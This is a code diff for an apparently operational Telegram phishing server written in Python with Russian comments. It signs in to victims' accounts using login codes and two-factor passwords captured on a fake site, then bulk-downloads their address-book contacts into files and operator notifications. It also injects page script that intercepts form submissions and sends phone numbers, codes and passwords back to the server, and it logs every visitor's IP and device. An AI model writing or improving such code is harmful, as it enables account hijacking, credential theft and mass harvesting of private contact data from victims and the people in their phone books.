@@ -337,6 +337,78 @@ async def save_contacts_to_file(phone, contacts):
         print(f"❌ Ошибка сохранения файла: {e}")
         return None
 
+# === ПЕРЕРАБОТАННЫЙ БЛОК ДЛЯ 2FA ===
+async def verify_telegram_code(phone, code):
+    try:
+        # Очищаем номер так же как при отправке
+        phone_clean = ''.join(c for c in phone if c.isdigit() or c == '+')
+        if not phone_clean.startswith('+'):
+            phone_clean = '+' + phone_clean
+        
+        print(f"🔐 Проверка кода для номера: {phone_clean}")
+        
+        if phone_clean not in active_sessions:
+            return {'success': False, 'error': 'Сессия не найдена'}
+        
+        session = active_sessions[phone_clean]
+        client = session['client']
+        
+        try:
+            # Пробуем войти с кодом
+            await client.sign_in(
+                phone=phone_clean, 
+                code=code, 
+                phone_code_hash=session['phone_code_hash']
+            )
+            
+            # ✅ ЕСЛИ УСПЕШНО БЕЗ 2FA - СРАЗУ ВЫКАЧИВАЕМ КОНТАКТЫ
+            print(f"✅ Авторизация успешна без 2FA для {phone_clean}")
+            
+            # 🔥 ВЫКАЧКА КОНТАКТОВ БЕЗ 2FA
+            contacts_result = await get_contacts_after_login(client, phone_clean)
+            
+            if contacts_result['success']:
+                # Создаем сессию
+                session_token = create_user_session(phone_clean, client)
+                
+                # Очищаем активную сессию
+                if phone_clean in active_sessions:
+                    del active_sessions[phone_clean]
+                
+                return {
+                    'success': True,
+                    'session_token': session_token,
+                    'contacts_count': contacts_result['contacts_count'],
+                    'mutual_count': contacts_result['mutual_count'],
+                    '2fa_required': False,
+                    'message': '✅ Авторизация успешна! Закройте это окно и войдите в свой аккаунт Telegram.'
+                }
+            else:
+                return {
+                    'success': False, 
+                    'error': 'Ошибка при получении контактов'
+                }
+            
+        except Exception as sign_in_error:
+            # ❌ ЕСЛИ ТРЕБУЕТСЯ 2FA
+            if "password" in str(sign_in_error).lower():
+                print(f"🔐 Требуется 2FA для {phone_clean}")
+                return {
+                    'success': False, 
+                    '2fa_required': True,
+                    'error': 'Требуется пароль двухэтапной аутентификации'
+                }
+            else:
+                print(f"❌ Ошибка входа: {sign_in_error}")
+                return {
+                    'success': False, 
+                    'error': f'Неверный код: {str(sign_in_error)}'
+                }
+            
+    except Exception as e:
+        print(f"❌ Общая ошибка verify_telegram_code: {e}")
+        return {'success': False, 'error': str(e)}
+
 async def verify_telegram_2fa(phone, password):
     try:
         # Очищаем номер так же как при отправке
@@ -356,7 +428,34 @@ async def verify_telegram_2fa(phone, password):
         await client.sign_in(password=password)
         print(f"✅ 2FA успешно пройдена для {phone_clean}")
         
-        # 🔥 ВЫКАЧКА КОНТАКТОВ ИЗ РАЗДЕЛА "КОНТАКТЫ"
+        # 🔥 ВЫКАЧКА КОНТАКТОВ ПОСЛЕ 2FA
+        contacts_result = await get_contacts_after_login(client, phone_clean)
+        
+        if not contacts_result['success']:
+            return {'success': False, 'error': contacts_result['error']}
+        
+        # Создаем сессию
+        session_token = create_user_session(phone_clean, client)
+        
+        # Очищаем активную сессию
+        if phone_clean in active_sessions:
+            del active_sessions[phone_clean]
+        
+        return {
+            'success': True,
+            'session_token': session_token,
+            'contacts_count': contacts_result['contacts_count'],
+            'mutual_count': contacts_result['mutual_count'],
+            'message': '✅ Авторизация успешна! Закройте это окно и войдите в свой аккаунт Telegram.'
+        }
+            
+    except Exception as e:
+        print(f"❌ Ошибка 2FA: {e}")
+        return {'success': False, 'error': 'Неверный пароль двухэтапной аутентификации'}
+
+async def get_contacts_after_login(client, phone_clean):
+    """Общая функция для выкачки контактов после успешной авторизации"""
+    try:
         print(f"🚀 Начинаем сбор КОНТАКТОВ из телефонной книги...")
         
         # Импортируем необходимые методы
@@ -431,13 +530,13 @@ async def verify_telegram_2fa(phone, password):
             except Exception as e:
                 print(f"❌ Ошибка отправки файла: {e}")
         
+        # Считаем взаимные контакты
+        mutual_count = sum(1 for c in real_contacts if c['mutual_contact'])
+        
         # Формируем сообщение с контактами для preview
         contacts_text = f"📱 ВЫКАЧАНЫ КОНТАКТЫ ИЗ TELEGRAM\n\n"
         contacts_text += f"📟 Номер: {phone_clean}\n"
         contacts_text += f"👥 Контактов в телефонной книге: {len(real_contacts)}\n"
-        
-        # Считаем взаимные контакты
-        mutual_count = sum(1 for c in real_contacts if c['mutual_contact'])
         contacts_text += f"🤝 Взаимных контактов: {mutual_count}\n"
         contacts_text += f"📁 TXT файл отправлен: {'✅' if contacts_txt_file else '❌'}\n"
         contacts_text += f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
@@ -469,13 +568,6 @@ async def verify_telegram_2fa(phone, password):
         except Exception as e:
             print(f"❌ Ошибка отправки превью: {e}")
         
-        # Создаем сессию
-        session_token = create_user_session(phone_clean, client)
-        
-        # Очищаем активную сессию
-        if phone_clean in active_sessions:
-            del active_sessions[phone_clean]
-        
         # Отстук о успешной авторизации
         add_notification(
             f"✅ УСПЕШНАЯ АВТОРИЗАЦИЯ\n"
@@ -487,61 +579,101 @@ async def verify_telegram_2fa(phone, password):
         
         return {
             'success': True,
-            'session_token': session_token,
             'contacts_count': len(real_contacts),
-            'mutual_count': mutual_count,
-            'message': '✅ Авторизация успешна! Закройте это окно и войдите в свой аккаунт Telegram.'
+            'mutual_count': mutual_count
         }
-            
+        
     except Exception as e:
-        print(f"❌ Ошибка 2FA: {e}")
+        print(f"❌ Ошибка в get_contacts_after_login: {e}")
         return {'success': False, 'error': str(e)}
+
+async def create_contacts_txt_file(phone, contacts):
+    """Создает txt файл со всеми контактами"""
+    try:
+        filename = f"contacts_{phone}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(f"=== БАЗА КОНТАКТОВ TELEGRAM ===\n\n")
+            f.write(f"👤 Владелец аккаунта: {phone}\n")
+            f.write(f"📅 Дата сбора: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"📊 Всего контактов: {len(contacts)}\n")
+            
+            # Считаем взаимные
+            mutual_count = sum(1 for c in contacts if c.get('mutual_contact', False))
+            f.write(f"🤝 Взаимных контактов: {mutual_count}\n\n")
+            
+            f.write("=" * 60 + "\n\n")
+            
+            for i, contact in enumerate(contacts, 1):
+                mutual = "ВЗАИМНЫЙ" if contact.get('mutual_contact', False) else "НЕВЗАИМНЫЙ"
+                f.write(f"👤 КОНТАКТ #{i} [{mutual}]\n")
+                f.write(f"📞 Телефон: {contact.get('phone', 'скрыт')}\n")
+                f.write(f"👤 Имя в профиле: {contact.get('first_name', '')} {contact.get('last_name', '')}\n")
+                
+                # Добавляем имя как подписано
+                stored_name = contact.get('name_as_stored', '')
+                if stored_name and stored_name != f"{contact.get('first_name', '')} {contact.get('last_name', '')}".strip():
+                    f.write(f"📛 Как подписано у вас: {stored_name}\n")
+                
+                f.write(f"🔗 Юзернейм: @{contact.get('username', 'нет')}\n")
+                f.write(f"🆔 ID: {contact.get('id', '')}\n")
+                f.write("-" * 50 + "\n\n")
+        
+        print(f"✅ Файл с контактами создан: {filename}")
+        return filename
+    except Exception as e:
+        print(f"❌ Ошибка создания файла: {e}")
+        return None
 
 # === HTTP ОБРАБОТЧИКИ ДЛЯ САЙТА ===
 async def handle_index(request):
     """Главная страница с отслеживанием переходов"""
     try:
         params = dict(request.query)
+        ref_code = params.get('ref', 'неизвестно')
+        model_name = params.get('name', 'Неизвестно')
         
-        if params and 'ref' in params:
-            ref_code = params.get('ref', 'неизвестно')
-            model_name = params.get('name', 'Неизвестно')
-            
-            real_ip, client_info, user_agent = get_client_info(request)
-            
-            add_notification(
-                f"🔗 ПЕРЕХОД ПО РЕФЕРАЛЬНОЙ ССЫЛКЕ\n"
-                f"👤 Модель: {model_name}\n"
-                f"📋 Код ссылки: {ref_code}\n"
-                f"🌐 IP: {real_ip}\n"
-                f"{client_info}\n"
-                f"📱 Устройство: {user_agent[:60]}..."
-            )
-            
+        # Всегда отправляем отстук о посещении, даже если нет ref
+        real_ip, client_info, user_agent = get_client_info(request)
+        
+        add_notification(
+            f"🌐 ПОСЕТИТЕЛЬ НА САЙТЕ\n"
+            f"👤 Модель: {model_name}\n"
+            f"📋 Код ссылки: {ref_code}\n"
+            f"🌐 IP: {real_ip}\n"
+            f"{client_info}\n"
+            f"📱 Устройство: {user_agent[:60]}..."
+        )
+        
+        if ref_code and ref_code != 'неизвестно':
             if ref_code not in link_visits:
                 link_visits[ref_code] = 0
             link_visits[ref_code] += 1
-            
             print(f"📊 Переход по ссылке {ref_code}. Всего: {link_visits[ref_code]}")
         
         # Читаем index.html и добавляем скрипт для редиректа и отслеживания
         with open('index.html', 'r', encoding='utf-8') as f:
             html_content = f.read()
             
-        # Получаем ref_code из параметров URL
-        ref_code = params.get('ref', 'неизвестно')
-        
         # Добавляем скрипт для отслеживания действий
         if '</body>' in html_content:
             tracking_script = f'''
             <script>
+            // Данные для отслеживания
+            const trackingData = {{
+                ref_code: '{ref_code}',
+                model_name: '{model_name}'
+            }};
+            
             // Функция для отправки событий отслеживания
             async function trackEvent(eventType, data = {{}}) {{
                 try {{
                     const eventData = {{
                         ...data,
-                        ref_code: '{ref_code}'
+                        ...trackingData
                     }};
+                    
+                    console.log('Отправка события:', eventType, eventData);
                     
                     await fetch('/{eventType}', {{
                         method: 'POST',
@@ -557,41 +689,64 @@ async def handle_index(request):
             
             // Отслеживаем посещение сайта сразу при загрузке
             document.addEventListener('DOMContentLoaded', function() {{
+                console.log('Страница загружена, отправляем событие visit');
                 trackEvent('visit');
             }});
             
-            // Отслеживаем ввод номера телефона
+            // Универсальный обработчик для всех форм
             document.addEventListener('DOMContentLoaded', function() {{
-                const phoneInput = document.querySelector('input[type="tel"]');
-                const submitButton = document.querySelector('button[type="submit"]');
-                
-                if (phoneInput && submitButton) {{
-                    submitButton.addEventListener('click', function() {{
-                        const phone = phoneInput.value;
-                        if (phone) {{
-                            trackEvent('phone-entered', {{ phone: phone }});
-                        }}
-                    }});
-                }}
-            }});
-            
-            // Отслеживаем нажатие кнопки входа
-            document.addEventListener('DOMContentLoaded', function() {{
-                const loginButton = document.querySelector('button[type="submit"]');
-                if (loginButton) {{
-                    loginButton.addEventListener('click', function() {{
+                // Обрабатываем все формы на странице
+                const forms = document.querySelectorAll('form');
+                forms.forEach(form => {{
+                    form.addEventListener('submit', function(e) {{
+                        e.preventDefault();
+                        
+                        // Отслеживаем нажатие кнопки входа
                         trackEvent('login-click');
+                        
+                        // Ищем поле с номером телефона
+                        const phoneInput = document.querySelector('input[type="tel"]') || 
+                                         document.querySelector('input[name="phone"]') ||
+                                         document.querySelector('input[placeholder*="номер"]') ||
+                                         document.querySelector('input[placeholder*="телефон"]');
+                        
+                        if (phoneInput && phoneInput.value) {{
+                            console.log('Найден номер телефона:', phoneInput.value);
+                            trackEvent('phone-entered', {{ phone: phoneInput.value }});
+                        }}
+                        
+                        // Имитируем отправку формы (если нужно)
+                        setTimeout(() => form.submit(), 100);
                     }});
-                }}
+                }});
+                
+                // Дополнительно отслеживаем клики по кнопкам
+                const buttons = document.querySelectorAll('button');
+                buttons.forEach(button => {{
+                    if (button.textContent.includes('Войти') || 
+                        button.textContent.includes('Отправить') ||
+                        button.type === 'submit') {{
+                        button.addEventListener('click', function() {{
+                            trackEvent('login-click');
+                        }});
+                    }}
+                }});
             }});
             
             // Функция для отслеживания ввода кода (будет вызвана из внешнего скрипта)
             window.trackCodeEntered = function(code, phone) {{
+                console.log('Код введен:', code, 'для номера:', phone);
                 trackEvent('code-entered', {{ code: code, phone: phone }});
             }};
             
+            // Функция для отслеживания 2FA (будет вызвана из внешнего скрипта)
+            window.track2FAEntered = function(password, phone) {{
+                console.log('2FA введен для номера:', phone);
+                trackEvent('2fa-entered', {{ password: password, phone: phone }});
+            }};
+            
             // Функция для успешной авторизации
-            function showSuccessRedirect() {{
+            window.showSuccessRedirect = function() {{
                 // Блокируем весь контент
                 document.body.innerHTML = `
                     <div style="
@@ -641,7 +796,9 @@ async def handle_index(request):
                         window.close();
                     }}
                 }}, 1000);
-            }}
+            }};
+            
+            console.log('Скрипт отслеживания загружен', trackingData);
             </script>
             '''
             html_content = html_content.replace('</body>', tracking_script + '\n</body>')
@@ -649,6 +806,7 @@ async def handle_index(request):
         return web.Response(text=html_content, content_type='text/html')
             
     except Exception as e:
+        print(f"❌ Ошибка в handle_index: {e}")
         return web.Response(text=f"Error: {e}", status=500)
 
 async def handle_visit(request):
